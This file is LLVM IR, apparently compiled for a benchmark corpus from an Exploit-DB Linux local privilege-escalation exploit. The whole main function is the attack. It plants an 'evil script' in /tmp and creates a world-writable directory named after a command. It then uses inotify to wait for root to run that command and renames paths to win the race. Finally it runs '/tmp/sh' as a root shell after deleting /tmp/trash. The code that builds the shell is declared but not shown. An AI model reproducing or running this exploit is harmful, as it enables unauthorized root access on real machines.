; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_18147.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_18147.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [10 x i8] c"/tmp/evil\00", align 1
@.str.1 = private unnamed_addr constant [11 x i8] c"/tmp/trash\00", align 1
@.str.2 = private unnamed_addr constant [22 x i8] c"usage: %s <cmd name>\0A\00", align 1
@.str.3 = private unnamed_addr constant [35 x i8] c"[*] launching attack against \22%s\22\0A\00", align 1
@.str.4 = private unnamed_addr constant [38 x i8] c"[+] creating evil script (/tmp/evil)\0A\00", align 1
@.str.5 = private unnamed_addr constant [8 x i8] c"/tmp/%s\00", align 1
@.str.6 = private unnamed_addr constant [36 x i8] c"[+] creating target directory (%s)\0A\00", align 1
@S_IRWXU = common dso_local global i32 0, align 4
@S_IRWXG = common dso_local global i32 0, align 4
@S_IRWXO = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [24 x i8] c"[+] initialize inotify\0A\00", align 1
@IN_CREATE = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [37 x i8] c"[+] waiting for root to launch \22%s\22\0A\00", align 1
@SYS_read = common dso_local global i32 0, align 4
@SYS_rename = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [34 x i8] c"[+] opening root shell (/tmp/sh)\0A\00", align 1
@.str.10 = private unnamed_addr constant [48 x i8] c"rm -fr /tmp/trash;/tmp/sh || echo \22[-] Failed.\22\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [1 x i8], align 1
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0), i8** %10, align 8
  store i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i64 0, i64 0), i8** %11, align 8
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %12, 2
  br i1 %13, label %14, label %19

14:                                               ; preds = %2
  %15 = load i8**, i8*** %5, align 8
  %16 = getelementptr inbounds i8*, i8** %15, i64 0
  %17 = load i8*, i8** %16, align 8
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.2, i64 0, i64 0), i8* %17)
  store i32 1, i32* %3, align 4
  br label %70

19:                                               ; preds = %2
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 1
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.3, i64 0, i64 0), i8* %22)
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.4, i64 0, i64 0))
  %25 = load i8*, i8** %10, align 8
  %26 = call i32 @create_nasty_shell(i8* %25)
  %27 = call i8* @malloc(i32 14)
  store i8* %27, i8** %9, align 8
  %28 = load i8*, i8** %9, align 8
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 1
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @sprintf(i8* %28, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0), i8* %31)
  %33 = load i8*, i8** %9, align 8
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.6, i64 0, i64 0), i8* %33)
  %35 = load i8*, i8** %9, align 8
  %36 = load i32, i32* @S_IRWXU, align 4
  %37 = load i32, i32* @S_IRWXG, align 4
  %38 = or i32 %36, %37
  %39 = load i32, i32* @S_IRWXO, align 4
  %40 = or i32 %38, %39
  %41 = call i32 @mkdir(i8* %35, i32 %40)
  %42 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.7, i64 0, i64 0))
  %43 = call i32 (...) @inotify_init()
  store i32 %43, i32* %6, align 4
  %44 = load i32, i32* %6, align 4
  %45 = load i8*, i8** %9, align 8
  %46 = load i32, i32* @IN_CREATE, align 4
  %47 = call i32 @inotify_add_watch(i32 %44, i8* %45, i32 %46)
  store i32 %47, i32* %7, align 4
  %48 = load i8**, i8*** %5, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 1
  %50 = load i8*, i8** %49, align 8
  %51 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.8, i64 0, i64 0), i8* %50)
  %52 = load i32, i32* @SYS_read, align 4
  %53 = load i32, i32* %6, align 4
  %54 = getelementptr inbounds [1 x i8], [1 x i8]* %8, i64 0, i64 0
  %55 = call i32 (i32, ...) @syscall(i32 %52, i32 %53, i8* %54, i32 1)
  %56 = load i32, i32* @SYS_rename, align 4
  %57 = load i8*, i8** %9, align 8
  %58 = load i8*, i8** %11, align 8
  %59 = call i32 (i32, ...) @syscall(i32 %56, i8* %57, i8* %58)
  %60 = load i32, i32* @SYS_rename, align 4
  %61 = load i8*, i8** %10, align 8
  %62 = load i8*, i8** %9, align 8
  %63 = call i32 (i32, ...) @syscall(i32 %60, i8* %61, i8* %62)
  %64 = load i32, i32* %6, align 4
  %65 = load i32, i32* %7, align 4
  %66 = call i32 @inotify_rm_watch(i32 %64, i32 %65)
  %67 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.9, i64 0, i64 0))
  %68 = call i32 @sleep(i32 2)
  %69 = call i32 @system(i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.10, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %70

70:                                               ; preds = %19, %14
  %71 = load i32, i32* %3, align 4
  ret i32 %71
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @create_nasty_shell(i8*) #1

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*) #1

declare dso_local i32 @mkdir(i8*, i32) #1

declare dso_local i32 @inotify_init(...) #1

declare dso_local i32 @inotify_add_watch(i32, i8*, i32) #1

declare dso_local i32 @syscall(i32, ...) #1

declare dso_local i32 @inotify_rm_watch(i32, i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @system(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
